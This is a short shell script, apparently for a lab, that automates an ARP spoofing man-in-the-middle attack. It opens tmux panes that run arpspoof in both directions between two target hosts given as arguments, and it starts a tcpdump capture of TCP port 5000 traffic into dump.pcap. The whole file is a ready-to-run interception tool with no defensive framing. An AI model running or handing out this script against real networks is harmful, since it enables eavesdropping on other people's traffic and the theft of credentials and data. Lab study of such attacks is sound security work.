# new tmux session
tmux new-session -d -s spoof -n main

# create the necessary windows
tmux split-window -v -t spoof:main.0
tmux split-window -h -t spoof:main.1

# send arp spoof commands to bottom windows and enter them
tmux send-keys -t spoof:main.1 "sudo arpspoof -i enp0s8 -t $1 $2" C-m
tmux send-keys -t spoof:main.2 "sudo arpspoof -i enp0s8 -t $2 $1" C-m

# send tcpdump command to main window
tmux send-keys -t spoof:main.0 "sudo tcpdump -i enp0s8 -A -s 0 -n tcp port 5000 -w dump.pcap"

# select main window and enter session
tmux select-pane -t spoof:main.0
tmux attach-session -t spoof
